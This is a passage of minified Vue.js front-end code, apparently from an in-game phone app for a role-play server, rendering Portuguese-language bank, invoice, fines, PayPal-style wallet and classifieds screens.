    tC = {
        class: "p-5"
    },
    nC = Pl("label", {
        class: "text-gray-700 font-semibold"
    }, "Passaporte", -1),
    lC = Pl("button", {
        class: "w-full rounded-full bank-light text-white p-5"
    }, " Transferir para esse passaporte ", -1);
an();
const aC = zw(((e, t, n, l, a, s) => {
    const o = dl("Page");
    return wl(), _l(o, {
        header: null
    }, {
        default: zw((() => [Pl("div", Bw, [Pl("button", {
            class: "p-5 mt-8",
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
        }, [Hw]), 0 == l.step ? (wl(), _l("div", qw, [Pl("div", Gw, [Ww, Pl("p", Kw, [Jw, Pl("strong", null, g(e.$currency) + " " + g(l.balance.toLocaleString("pt-BR")), 1)])]), Pl("div", Xw, [Pl("div", Yw, [Pl("span", Zw, g(e.$currency), 1), Zn(Pl("input", {
            onKeydown: t[2] || (t[2] = us((e => 0 != l.value ? l.step = 1 : null), ["enter"])),
            "onUpdate:modelValue": t[3] || (t[3] = e => l.value = e),
            class: "w-full font-bold border-b pl-20"
        }, null, 544), [
            [ns, l.value]
        ])])]), Pl("button", {
            onClick: t[4] || (t[4] = e => 0 != l.value ? l.step = 1 : null),
            class: ["absolute bottom-8 right-8 flex flex-center w-24 h-24 rounded-full", {
                "bg-gray-100 text-gray-400": 0 == l.value,
                "bank-light text-white": 0 != l.value
            }]
        }, [Qw], 2)])) : 1 == l.step ? (wl(), _l("div", eC, [Pl("div", tC, [nC, Zn(Pl("input", {
            "onUpdate:modelValue": t[5] || (t[5] = e => l.passport = e),
            class: "w-full mt-8 pb-2 border-b font-bold"
        }, null, 512), [
            [ns, l.passport]
        ])]), l.passport >= 0 ? (wl(), _l("div", {
            key: 0,
            onClick: t[6] || (t[6] = (...e) => l.submit && l.submit(...e)),
            class: "absolute inset-x-8 bottom-8"
        }, [lC])) : Ml("", !0)])) : Ml("", !0)])])),
        _: 1
    })
}));
Fw.render = aC, Fw.__scopeId = "data-v-2062cc68";
const sC = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!1);
            const e = ec();
            let {
                name: t,
                value: n
            } = e.query;
            n = Number(n).toLocaleString("pt-BR");
            const l = new Date;
            return {
                name: t,
                value: n,
                time: l.getHours() + "h" + String(l.getMinutes()).padStart(2, 0)
            }
        }
    },
    oC = sn("data-v-180baeb8");
ln("data-v-180baeb8");
const rC = {
        class: "mt-auto flex-1 bg-white relative"
    },
    iC = Pl("i", {
        class: "fal fa-times text-4xl text-gray-600"
    }, null, -1),
    cC = {
        class: "p-8"
    },
    uC = Pl("img", {
        class: "w-1/3 mb-8 bank-from-pink-filter",
        src: "https://i.imgur.com/2BHyIED.jpg"
    }, null, -1),
    dC = Pl("h1", {
        class: "font-semibold"
    }, "Pronto, enviamos sua transferência", -1),
    pC = {
        class: "flex flex-col items-center mt-8 p-4 py-12 border"
    },
    fC = {
        class: "font-bold text-5xl"
    },
    mC = {
        class: "mt-8 text-2xl"
    },
    hC = Pl("span", {
        class: "text-gray-600"
    }, "Agora mesmo", -1);
an();
const bC = oC(((e, t, n, l, a, s) => {
    const o = dl("Page");
    return wl(), _l(o, {
        header: null
    }, {
        default: oC((() => [Pl("div", rC, [Pl("button", {
            class: "p-5 mt-8",
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
        }, [iC]), Pl("div", null, [Pl("div", cC, [uC, dC, Pl("div", pC, [Pl("p", fC, g(e.$currency) + " " + g(l.value), 1), Pl("p", null, "para " + g(l.name), 1), Pl("p", mC, [hC, Il(" • " + g(l.time), 1)])])])])])])),
        _: 1
    })
}));
sC.render = bC, sC.__scopeId = "data-v-180baeb8";
const gC = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!1);
            const e = rt(0),
                t = rt([]);
            return _o.backend.bank_getBalance().then((t => e.value = t)), _o.backend.bank_extract().then((e => t.value = e.map((e => (e.description = e.description.replace(/<[^>]*>/g, ""), e))))), {
                balance: e,
                statements: t
            }
        }
    },
    vC = {
        class: "flex flex-col items-start bg-white h-full pt-12"
    },
    xC = Pl("i", {
        class: "far fa-chevron-left"
    }, null, -1),
    yC = {
        class: "p-8"
    },
    kC = Pl("h1", {
        class: "text-gray-600"
    }, "Saldo disponível", -1),
    wC = {
        class: "mt-2 font-bold text-5xl"
    },
    CC = Pl("hr", {
        class: "w-full"
    }, null, -1),
    _C = {
        class: "flex flex-col h-full w-full overflow-y-auto hide-scroll"
    },
    AC = Pl("h1", {
        class: "font-bold text-4xl px-8 pt-8 pb-4"
    }, "Histórico", -1),
    SC = {
        key: 0,
        class: "text-xl text-gray-400"
    },
    RC = {
        key: 0,
        class: "mt-8 text-center text-3xl"
    },
    TC = Pl("i", {
        class: "fal fa-history"
    }, null, -1),
    EC = Il(" Nenhuma atividade recente ");
gC.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, {
        header: null
    }, {
        default: en((() => [Pl("div", vC, [Pl("button", {
            class: "p-8 text-gray-600",
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
        }, [xC]), Pl("div", yC, [kC, Pl("h1", wC, g(e.$currency) + " " + g(l.balance.toLocaleString("pt-BR")), 1)]), CC, Pl("div", _C, [AC, Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.statements, ((e, t) => (wl(), _l("li", {
            key: t,
            class: "p-4 px-8 border-b"
        }, [Pl("p", null, g(e.description), 1), e.created_at ? (wl(), _l("p", SC, g(e.created_at), 1)) : Ml("", !0)])))), 128)), l.statements.length ? Ml("", !0) : (wl(), _l("p", RC, [TC, EC]))])])])])),
        _: 1
    })
};
const PC = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!1);
            const e = jl("alert"),
                t = rt("received"),
                n = rt(0),
                l = rt([]),
                a = da((() => l.value.filter((e => ("sent" === t.value ? e.payee_id : e.payer_id) === _o.identity.user_id))));
            return _o.backend.bank_getBalance().then((e => n.value = e)), _o.backend.bank_getInvoices().then((e => l.value = e)), {
                balance: n,
                invoices: l,
                filtered: a,
                pay: function(t) {
                    _o.backend.bank_payInvoice(t.id).then((a => {
                        if (null == a ? void 0 : a.error) e(a.error);
                        else {
                            _k(n, Math.max(0, n.value - t.value));
                            const e = l.value.indexOf(t);
                            l.value.splice(e, 1)
                        }
                    }))
                },
                tab: t
            }
        }
    },
    LC = {
        class: "flex flex-col items-start h-full bg-white"
    },
    IC = Pl("i", {
        class: "far fa-chevron-left"
    }, null, -1),
    OC = {
        class: "px-8 pb-8 w-full border-b"
    },
    MC = Pl("h1", {
        class: "text-4xl text-gray-600 font-semibold"
    }, "Saldo disponível", -1),
    VC = {
        class: "mt-4 text-5xl font-bold"
    },
    DC = {
        class: "grid grid-cols-2 w-full text-3xl border-b"
    },
    UC = {
        class: "flex-1 w-full overflow-y-auto hide-scroll"
    },
    NC = {
        class: "flex-1"
    },
    $C = {
        class: "break-words text-3xl"
    },
    jC = {
        class: "text-gray-500 text-xl"
    },
    FC = {
        class: "ml-auto text-red-500 font-semibold px-4"
    },
    zC = {
        key: 0,
        class: "mt-8 text-center text-3xl"
    },
    BC = Pl("i", {
        class: "fal fa-file-invoice-dollar"
    }, null, -1),
    HC = Il(" Nenhuma fatura em aberto ");
PC.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, {
        header: null
    }, {
        default: en((() => [Pl("div", LC, [Pl("button", {
            class: "p-8 pt-16 text-gray-600",
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
        }, [IC]), Pl("div", OC, [MC, Pl("p", VC, g(e.$currency) + " " + g(l.balance.toLocaleString("pt-BR")), 1)]), Pl("div", DC, [Pl("button", {
            onClick: t[2] || (t[2] = e => l.tab = "received"),
            class: [{
                "bank-light text-white": "received" === l.tab
            }, "p-4 text-center font-bold border-r"]
        }, "Recebidas", 2), Pl("button", {
            onClick: t[3] || (t[3] = e => l.tab = "sent"),
            class: [{
                "bank-light text-white": "sent" === l.tab
            }, "p-4 text-center font-bold"]
        }, "Enviadas", 2)]), Pl("ul", UC, [(wl(!0), _l(bl, null, fa(l.filtered, ((t, n) => (wl(), _l("li", {
            key: n,
            class: "flex items-center px-4 py-4 border-b"
        }, [Pl("div", NC, [Pl("h1", $C, g(t.reason), 1), Pl("p", jC, g(t.name) + " - " + g(e.$filters.unixToRelative(t.created_at)), 1)]), Pl("p", FC, g(e.$currency) + " " + g(t.value.toLocaleString("pt-BR")), 1), "received" === l.tab ? (wl(), _l("button", {
            key: 0,
            onClick: e => l.pay(t),
            class: "bank-light text-white px-6 py-2 rounded-xl"
        }, " Pagar ", 8, ["onClick"])) : Ml("", !0)])))), 128)), l.filtered.length ? Ml("", !0) : (wl(), _l("p", zC, [BC, HC]))])])])),
        _: 1
    })
};
const qC = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!1);
            const e = jl("alert"),
                t = rt(0),
                n = rt(0),
                l = rt(""),
                a = rt(1),
                s = rt({});
            return Rn(n, (e => {
                n.value = Number(e.replace(/\D/g, "")).toLocaleString("pt-BR")
            })), {
                step: a,
                submit: function() {
                    const o = Number(n.value.replace(/\D/g, ""));
                    _o.backend.bank_storeInvoice(t.value, o, l.value).then((t => {
                        if (t.error) e(t.error);
                        else {
                            const e = new Date;
                            t.time = e.getHours() + "h" + String(e.getMinutes()).padStart(2, 0), s.value = t, a.value = 2
                        }
                    }))
                },
                passport: t,
                value: n,
                reason: l,
                receipt: s
            }
        }
    },
    GC = {
        class: "h-full bg-white"
    },
    WC = Pl("i", {
        class: "far fa-chevron-left"
    }, null, -1),
    KC = {
        key: 0
    },
    JC = {
        class: "p-8"
    },
    XC = Pl("label", {
        class: "text-3xl text-gray-500"
    }, "Passaporte", -1),
    YC = {
        class: "px-8 pb-8"
    },
    ZC = Pl("label", {
        class: "text-3xl text-gray-500"
    }, "Valor da fatura", -1),
    QC = {
        class: "mt-4 relative text-5xl"
    },
    e_ = {
        class: "absolute bottom-1.5 font-bold"
    },
    t_ = {
        class: "px-8"
    },
    n_ = Pl("label", {
        class: "text-3xl text-gray-500"
    }, "Razão", -1),
    l_ = Pl("button", {
        class: "w-full rounded-full bank-light text-white p-5"
    }, " Criar fatura ", -1),
    a_ = {
        key: 1,
        class: "p-8"
    },
    s_ = Pl("img", {
        class: "w-1/3 mb-8 bank-from-pink-filter",
        src: "https://i.imgur.com/2BHyIED.jpg"
    }, null, -1),
    o_ = Pl("h1", {
        class: "font-semibold"
    }, "Pronto, enviamos sua fatura", -1),
    r_ = {
        class: "flex flex-col items-center mt-8 p-4 py-12 border"
    },
    i_ = {
        class: "font-bold text-5xl"
    },
    c_ = {
        class: "mt-8 text-2xl"
    },
    u_ = Pl("span", {
        class: "text-gray-600"
    }, "Agora mesmo", -1);
qC.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, {
        header: null
    }, {
        default: en((() => [Pl("div", GC, [Pl("button", {
            class: "p-8 pt-16 text-gray-600",
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
        }, [WC]), 1 == l.step ? (wl(), _l("div", KC, [Pl("div", JC, [XC, Zn(Pl("input", {
            "onUpdate:modelValue": t[2] || (t[2] = e => l.passport = e),
            maxlength: 11,
            class: "w-full mt-4 font-bold border-b text-5xl"
        }, null, 512), [
            [ns, l.passport]
        ])]), Pl("div", YC, [ZC, Pl("div", QC, [Pl("span", e_, g(e.$currency), 1), Zn(Pl("input", {
            "onUpdate:modelValue": t[3] || (t[3] = e => l.value = e),
            maxlength: 11,
            class: "w-full font-bold border-b pl-20"
        }, null, 512), [
            [ns, l.value]
        ])])]), Pl("div", t_, [n_, Zn(Pl("input", {
            "onUpdate:modelValue": t[4] || (t[4] = e => l.reason = e),
            maxlength: "100",
            spellcheck: "false",
            placeholder: "Razão da fatura",
            class: "w-full mt-4 font-bold text-4xl pb-2 border-b"
        }, null, 512), [
            [ns, l.reason]
        ])]), l.passport >= 0 && 0 != l.value && l.reason.trim() ? (wl(), _l("div", {
            key: 0,
            onClick: t[5] || (t[5] = (...e) => l.submit && l.submit(...e)),
            class: "absolute inset-x-8 bottom-8"
        }, [l_])) : Ml("", !0)])) : 2 == l.step ? (wl(), _l("div", a_, [s_, o_, Pl("div", r_, [Pl("p", i_, g(e.$currency) + " " + g(l.receipt.value.toLocaleString("pt-BR")), 1), Pl("p", null, "para " + g(l.receipt.name), 1), Pl("p", c_, [u_, Il(" • " + g(l.receipt.time), 1)])])])) : Ml("", !0)])])),
        _: 1
    })
};
const d_ = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!1);
            const e = jl("alert"),
                t = rt(0),
                n = rt([]);
            return _o.backend.bank_getBalance().then((e => t.value = e)), _o.backend.bank_getFines().then((e => n.value = e)), {
                balance: t,
                fines: n,
                pay: function(l) {
                    _o.backend.bank_payFine(l.id).then((a => {
                        if (null == a ? void 0 : a.error) e(a.error);
                        else {
                            _k(t, Math.max(0, t.value - l.total));
                            const e = n.value.indexOf(l);
                            n.value.splice(e, 1)
                        }
                    }))
                }
            }
        }
    },
    p_ = {
        class: "flex flex-col items-start h-full bg-white"
    },
    f_ = Pl("i", {
        class: "far fa-chevron-left"
    }, null, -1),
    m_ = {
        class: "px-8 pb-8 w-full border-b"
    },
    h_ = Pl("h1", {
        class: "text-4xl text-gray-600 font-semibold"
    }, "Saldo disponível", -1),
    b_ = {
        class: "mt-4 text-5xl font-bold"
    },
    g_ = Pl("p", {
        class: "px-8 py-8 font-bold text-3xl"
    }, "Multas", -1),
    v_ = {
        class: "flex-1 w-full overflow-y-auto hide-scroll"
    },
    x_ = {
        class: "flex-1"
    },
    y_ = {
        class: "break-words text-3xl"
    },
    k_ = {
        class: "text-gray-500 text-xl"
    },
    w_ = {
        class: "ml-auto text-red-500 font-semibold px-4"
    },
    C_ = {
        key: 0,
        class: "mt-8 text-center text-3xl"
    },
    __ = Pl("i", {
        class: "fal fa-gavel"
    }, null, -1),
    A_ = Il(" Nenhuma multa pendente ");
d_.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, {
        header: null
    }, {
        default: en((() => [Pl("div", p_, [Pl("button", {
            class: "p-8 pt-16 text-gray-600",
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
        }, [f_]), Pl("div", m_, [h_, Pl("p", b_, g(e.$currency) + " " + g(l.balance.toLocaleString("pt-BR")), 1)]), g_, Pl("ul", v_, [(wl(!0), _l(bl, null, fa(l.fines, ((t, n) => (wl(), _l("li", {
            key: n,
            class: "flex items-center px-4 py-4 border-b"
        }, [Pl("div", x_, [Pl("h1", y_, g(t.description), 1), Pl("p", k_, g(t.created_at), 1)]), Pl("p", w_, g(e.$currency) + " " + g(t.total.toLocaleString("pt-BR")), 1), Pl("button", {
            onClick: e => l.pay(t),
            class: "bank-light text-white px-6 py-2 rounded-xl"
        }, " Pagar ", 8, ["onClick"])])))), 128)), l.fines.length ? Ml("", !0) : (wl(), _l("p", C_, [__, A_]))])])])),
        _: 1
    })
};
const S_ = {
        setup() {
            jl("setDark")(!1);
            const e = jl("alert"),
                t = _o.identity,
                n = rt(0),
                l = rt("resume"),
                a = rt(null),
                s = rt([]),
                o = rt(_o.hasNotificationFor("paypal"));

            function r(t) {
                return ({
                    error: l,
                    transaction: o
                }) => {
                    l ? e(l) : (s.value.unshift(o), n.value += t * o.value, i(o), "payment" === o.type ? a.value = o : "deposit" === o.type && (d.bank -= o.value))
                }
            }

            function i(e) {
                l.value = "details", a.value = e
            }
            Rn(o, (e => _o.setNotificationFor("paypal", e))), _o.localhost && s.value.push({
                id: 1,
                user_id: 1,
                target: 1,
                value: 100,
                type: "deposit",
                created_at: Date.now() / 1e3
            }), _o.onceRoute("PAYPAL", (({
                value: e
            }) => _k(n, n.value + e))), r.add = r(1), r.rem = r(-1);
            const c = Ze({});
            const u = Ze({});
            const d = Ze({
                bank: 0
            });
            _o.backend.paypal_index().then((e => {
                n.value = e.balance, d.bank = e.bank, s.value = e.transactions
            }));
            const p = da((() => s.value.find((e => "payment" === e.type))));
            return {
                isAndroid: _o.settings.isAndroid,
                notifications: o,
                identity: t,
                action: l,
                firstPayment: p,
                payment: a,
                openPayment: i,
                balance: n,
                extract: s,
                send: c,
                submitSend: function() {
                    var t;
                    const n = parseInt(null == (t = c.value) ? void 0 : t.replace(/\D/g, ""));
                    c.user_id ? n ? _o.lockAndProceed((() => _o.backend.paypal_send(c.user_id, n, c.message).then(r.rem))) : e("Digite o valor a ser transferido") : e("Digite o passaporte do jogador")
                },
                transfer: u,
                submitTransfer: function() {
                    var t;
                    const n = parseInt(null == (t = u.value) ? void 0 : t.replace(/\D/g, ""));
                    n ? _o.lockAndProceed((() => _o.backend.paypal_transfer(n).then(r.rem))) : e("Digite o valor a ser transferido")
                },
                deposit: d,
                submitDeposit: function() {
                    var t;
                    const n = parseInt(null == (t = d.value) ? void 0 : t.replace(/\D/g, ""));
                    n ? _o.lockAndProceed((() => _o.backend.paypal_deposit(n).then(r.add))) : e("Digite o valor de depósito")
                }
            }
        }
    },
    R_ = {
        class: "flex flex-col h-full bg-white"
    },
    T_ = {
        class: "flex-shrink-0 h-32 pt-16 border-b"
    },
    E_ = {
        key: 0,
        class: "text-blue-400"
    },
    P_ = Pl("i", {
        class: "fas fa-chevron-left"
    }, null, -1),
    L_ = {
        key: 1,
        class: "far fa-arrow-left"
    },
    I_ = {
        key: 0,
        class: "flex-1 overflow-y-auto hide-scroll p-5 bg-gray-100"
    },
    O_ = {
        key: 0,
        class: "bg-paypal h-80 rounded-lg p-8 text-white"
    },
    M_ = {
        class: "text-right"
    },
    V_ = {
        class: "text-2xl"
    },
    D_ = {
        class: "mt-6 text-4xl break-words"
    },
    U_ = {
        class: "bg-white mt-5 p-5 rounded-xl shadow-xl"
    },
    N_ = {
        class: "flex justify-between items-center"
    },
    $_ = Pl("h1", {
        class: "font-bold mb-2"
    }, "Saldo do PayPal", -1),
    j_ = {
        class: "align-top"
    },
    F_ = {
        class: "ml-3 text-6xl"
    },
    z_ = {
        class: "bg-white p-5 mt-8 rounded-xl shadow-xl"
    },
    B_ = Pl("i", {
        class: "far fa-list-ul mr-4"
    }, null, -1),
    H_ = Il(" Ver toda atividade "),
    q_ = {
        key: 1,
        class: "flex-1 bg-gray-100 overflow-y-auto p-5"
    },
    G_ = {
        class: "text-center"
    },
    W_ = Pl("svg", {
        class: "checkmark",
        xmlns: "http://www.w3.org/2000/svg",
        viewBox: "0 0 52 52"
    }, [Pl("circle", {
        class: "checkmark__circle",
        cx: "26",
        cy: "26",
        r: "25",
        fill: "none"
    }), Pl("path", {
        class: "checkmark__check",
        fill: "none",
        d: "M14.1 27.2l7.1 7.2 16.7-16.8"
    })], -1),
    K_ = {
        class: "mt-3 px-3"
    },
    J_ = {
        key: 0
    },
    X_ = {
        key: 1
    },
    Y_ = {
        key: 2
    },
    Z_ = {
        key: 3
    },
    Q_ = {
        key: 0,
        class: "mt-10 border text-center bg-white rounded-xl"
    },
    eA = Pl("h1", {
        class: "font-bold py-4"
    }, "MENSAGEM", -1),
    tA = Pl("hr", null, null, -1),
    nA = {
        class: "block py-2 break-words"
    },
    lA = {
        class: "mt-10 border text-center bg-white rounded-xl"
    },
    aA = Pl("h1", {
        class: "font-bold py-4"
    }, "DATA", -1),
    sA = Pl("hr", null, null, -1),
    oA = {
        class: "block py-2"
    },
    rA = {
        class: "mt-10 border text-center bg-white rounded-xl"
    },
    iA = Pl("h1", {
        class: "font-bold py-4"
    }, "CÓDIGO DE TRANSAÇÃO", -1),
    cA = Pl("hr", null, null, -1),
    uA = {
        class: "block py-2"
    },
    dA = {
        key: 2,
        class: "flex-1 bg-gray-100 overflow-y-auto hide-scroll"
    },
    pA = {
        class: "w-16 h-16 bg-gray-400 rounded-full text-center py-2 text-gray-100"
    },
    fA = {
        key: 0,
        class: "fas fa-handshake"
    },
    mA = {
        key: 1,
        class: "fas fa-university"
    },
    hA = {
        key: 2,
        class: "fas fa-piggy-bank"
    },
    bA = {
        class: "flex flex-col ml-3"
    },
    gA = {
        class: "font-semibold"
    },
    vA = {
        class: "text-xl text-gray-400"
    },
    xA = {
        class: "ml-auto self-start"
    },
    yA = {
        key: 3,
        class: "flex-1 bg-gray-100 p-5"
    },
    kA = {
        class: "mt-10"
    },
    wA = {
        class: "text-xl"
    },
    CA = Il("Valor disponível no paypal: "),
    _A = {
        class: "flex mt-5"
    },
    AA = {
        key: 4,
        class: "flex-1 bg-gray-100 p-5"
    },
    SA = {
        class: "text-xl"
    },
    RA = Il("Valor disponível no paypal: "),
    TA = {
        class: "mt-10 text-right"
    },
    EA = {
        key: 5,
        class: "flex-1 bg-gray-100 p-5"
    },
    PA = {
        class: "text-xl"
    },
    LA = Il("Valor disponível no banco: "),
    IA = {
        class: "mt-10 text-right"
    },
    OA = {
        class: "mt-auto h-32 flex-shrink-0 border-t shadow-2xl flex justify-around text-3xl"
    },
    MA = {
        class: "text-center mt-auto"
    },
    VA = Pl("i", {
        class: "fal fa-money-bill-wave-alt"
    }, null, -1),
    DA = Pl("span", {
        class: "block"
    }, "Enviar", -1),
    UA = {
        class: "text-center mt-auto"
    },
    NA = Pl("i", {
        class: "fal fa-university"
    }, null, -1),
    $A = Pl("span", {
        class: "block"
    }, "Sacar", -1),
    jA = {
        class: "text-center mt-auto"
    },
    FA = Pl("i", {
        class: "fal fa-piggy-bank"
    }, null, -1),
    zA = Pl("span", {
        class: "block"
    }, "Depositar", -1);
S_.render = function(e, t, n, l, a, s) {
    const o = dl("app-input");
    return wl(), _l("div", R_, [Pl("div", T_, [Pl("button", {
        onClick: t[1] || (t[1] = t => "resume" != l.action ? l.action = "resume" : e.$router.back()),
        class: "absolute top-16 left-0 px-4"
    }, [l.isAndroid ? (wl(), _l("i", L_)) : (wl(), _l("span", E_, [P_, Il(" " + g("resume" == l.action ? "Apps" : "Resumo"), 1)]))]), Pl("h1", {
        class: ["font-bold", {
            "ml-16": l.isAndroid,
            "text-center": !l.isAndroid
        }]
    }, g(l.isAndroid ? "resume" == l.action ? "PayPal" : "Resumo" : "PayPal"), 3)]), "resume" == l.action ? (wl(), _l("div", I_, [l.firstPayment ? (wl(), _l("div", O_, [Pl("div", M_, [Pl("span", V_, g(e.$filters.unixToDayOfMonth(l.firstPayment.created_at)), 1)]), Pl("p", D_, [Il(g(l.firstPayment.user_id == l.identity.user_id ? "Você" : l.firstPayment.fullName) + " enviou ", 1), Pl("b", null, g(e.$filters.intToMoney(l.firstPayment.value)), 1)]), Pl("button", {
        onClick: t[2] || (t[2] = e => l.openPayment(l.firstPayment)),
        class: "mt-8 border-2 px-6 py-1 rounded-full"
    }, "Ver detalhes")])) : Ml("", !0), Pl("div", U_, [Pl("div", N_, [$_, Pl("button", {
        onClick: t[3] || (t[3] = e => l.notifications = !l.notifications),
        class: "text-white bg-paypal-light h-12 w-12 text-xl rounded-full"
    }, [Pl("i", {
        class: ["far", l.notifications ? "fa-bell" : "fa-bell-slash"]
    }, null, 2)])]), Pl("span", j_, g(e.$currency), 1), Pl("span", F_, g(l.balance.toLocaleString("pt-BR")), 1)]), Pl("div", z_, [Pl("button", {
        class: "text-paypal-light",
        onClick: t[4] || (t[4] = e => l.action = "activity")
    }, [B_, H_])])])) : "details" == l.action ? (wl(), _l("div", q_, [Pl("div", G_, [W_, Pl("div", K_, ["withdraw" === l.payment.type ? (wl(), _l("p", J_, " Você sacou " + g(e.$filters.intToMoney(l.payment.value)), 1)) : "deposit" === l.payment.type ? (wl(), _l("p", X_, " Você depositou " + g(e.$filters.intToMoney(l.payment.value)), 1)) : l.payment.user_id === l.identity.user_id ? (wl(), _l("p", Y_, " Você enviou " + g(e.$filters.intToMoney(l.payment.value)) + " para " + g(l.payment.fullName), 1)) : (wl(), _l("p", Z_, " Você recebeu " + g(e.$filters.intToMoney(l.payment.value)) + " de " + g(l.payment.fullName), 1))])]), l.payment.description ? (wl(), _l("div", Q_, [eA, tA, Pl("span", nA, g(l.payment.description), 1)])) : Ml("", !0), Pl("div", lA, [aA, sA, Pl("span", oA, g(e.$filters.unixToDatetime(l.payment.created_at)), 1)]), Pl("div", rA, [iA, cA, Pl("span", uA, g(l.payment.id), 1)])])) : "activity" == l.action ? (wl(), _l("div", dA, [Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.extract, (t => (wl(), _l("li", {
        onClick: e => l.openPayment(t),
        key: t.id,
        class: "flex items-center border-b p-4 shadow"
    }, [Pl("div", pA, [t.user_id != t.target ? (wl(), _l("i", fA)) : "withdraw" == t.type ? (wl(), _l("i", mA)) : "deposit" == t.type ? (wl(), _l("i", hA)) : Ml("", !0)]), Pl("div", bA, [Pl("span", gA, g("payment" == t.type ? "Pagamento" : "withdraw" == t.type ? "Saque" : "Depósito"), 1), Pl("span", vA, g(e.$filters.unixToDate(t.created_at)), 1)]), Pl("div", xA, [Pl("span", {
        class: ["text-2xl", t.user_id == t.target && "withdraw" == t.type ? "text-red-500" : 0, t.user_id != t.target && t.user_id == l.identity.user_id ? "text-red-500" : 0]
    }, g(e.$filters.intToMoney(t.value)), 3)])], 8, ["onClick"])))), 128))])])) : "send" == l.action ? (wl(), _l("div", yA, [Pl(o, {
        modelValue: l.send.user_id,
        "onUpdate:modelValue": t[5] || (t[5] = e => l.send.user_id = e),
        format: "int",
        noborder: "1",
        class: "bg-transparent border-b border-blue-400",
        placeholder: "Passaporte"
    }, null, 8, ["modelValue"]), Pl("div", kA, [Pl(o, {
        modelValue: l.send.value,
        "onUpdate:modelValue": t[6] || (t[6] = e => l.send.value = e),
        format: "money",
        noborder: "1",
        class: "bg-transparent border-b border-blue-400",
        placeholder: "Valor a ser enviado"
    }, null, 8, ["modelValue"]), Pl("small", wA, [CA, Pl("b", null, g(e.$filters.intToMoney(l.balance)), 1)])]), Pl("div", _A, [Pl(o, {
        modelValue: l.send.message,
        "onUpdate:modelValue": t[7] || (t[7] = e => l.send.message = e),
        class: "rounded-full px-6",
        placeholder: "Deixa uma mensagem",
        maxlength: "250"
    }, null, 8, ["modelValue"]), Pl("button", {
        onClick: t[8] || (t[8] = (...e) => l.submitSend && l.submitSend(...e)),
        class: "ml-4 p-4 px-8 bg-paypal-light text-white font-semibold rounded-full"
    }, "Transferir")])])) : "transfer" == l.action ? (wl(), _l("div", AA, [Pl(o, {
        modelValue: l.transfer.value,
        "onUpdate:modelValue": t[9] || (t[9] = e => l.transfer.value = e),
        noborder: "1",
        format: "money",
        placeholder: "Valor para transferir",
        class: "bg-transparent border-b border-blue-400"
    }, null, 8, ["modelValue"]), Pl("small", SA, [RA, Pl("b", null, g(e.$filters.intToMoney(l.balance)), 1)]), Pl("div", TA, [Pl("button", {
        onClick: t[10] || (t[10] = (...e) => l.submitTransfer && l.submitTransfer(...e)),
        class: "bg-paypal-light p-4 px-8 text-white font-semibold rounded-full"
    }, "Sacar")])])) : "deposit" == l.action ? (wl(), _l("div", EA, [Pl(o, {
        modelValue: l.deposit.value,
        "onUpdate:modelValue": t[11] || (t[11] = e => l.deposit.value = e),
        noborder: "1",
        format: "money",
        placeholder: "Valor para depositar",
        class: "bg-transparent border-b border-blue-400"
    }, null, 8, ["modelValue"]), Pl("small", PA, [LA, Pl("b", null, g(e.$filters.intToMoney(l.deposit.bank)), 1)]), Pl("div", IA, [Pl("button", {
        onClick: t[12] || (t[12] = (...e) => l.submitDeposit && l.submitDeposit(...e)),
        class: "bg-paypal-light p-4 px-8 text-white font-semibold rounded-full"
    }, "Depositar")])])) : Ml("", !0), Pl("div", OA, [Pl("div", MA, [Pl("button", {
        onClick: t[13] || (t[13] = e => l.action = "send"),
        class: "bg-paypal-light text-white p-5 rounded-full"
    }, [VA]), DA]), Pl("div", UA, [Pl("button", {
        onClick: t[14] || (t[14] = e => l.action = "transfer"),
        class: "bg-paypal-light text-white p-5 rounded-full"
    }, [NA]), $A]), Pl("div", jA, [Pl("button", {
        onClick: t[15] || (t[15] = e => l.action = "deposit"),
        class: "bg-paypal-light text-white p-5 rounded-full"
    }, [FA]), zA])])])
};
const BA = {
        props: ["title"],
        setup: () => ({
            isAndroid: _o.settings.isAndroid
        })
    },
    HA = {
        class: "h-32 pt-16 bg-olx text-white flex-shrink-0"
    },
    qA = {
        key: 0,
        class: "far fa-arrow-left"
    },
    GA = {
        key: 1,
        class: "fas fa-chevron-left"
    };
BA.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", HA, [Pl("button", {
        onClick: t[1] || (t[1] = t => e.$router.back()),
        class: "absolute top-16 left-0 px-4"
    }, [l.isAndroid ? (wl(), _l("i", qA)) : (wl(), _l("i", GA))]), Pl("h1", {
        class: ["font-bold", {
            "ml-16": l.isAndroid,
            "text-center": !l.isAndroid
        }]
    }, g(n.title || "OLX"), 3)])
};
const WA = {
        props: ["data"],
        setup({
            data: e
        }) {
            const t = _o.identity.moderator,
                n = jl("confirm");
            return {
                moderator: t,
                destroy: function() {
                    n("Deseja excluir este anúncio?").then((t => {
                        t && _o.backend.olx_destroy(e.id).then((() => e.id = null))
                    }))
                }
            }
        }
    },
    KA = {
        key: 0
    },
    JA = {
        class: "border-t border-b border-theme p-4"
    },
    XA = {
        class: "text-4xl break-words mb-4"
    },
    YA = {
        class: "flex justify-between items-end"
    },
    ZA = {
        class: "block text-xl"
    },
    QA = {
        class: "flex"
    },
    eS = Pl("i", {
        class: "fal fa-trash-alt"
    }, null, -1);
WA.render = function(e, t, n, l, a, s) {
    return n.data.id ? (wl(), _l("div", KA, [Pl("img", {
        src: n.data.images[0],
        class: "w-full block",
        alt: ""
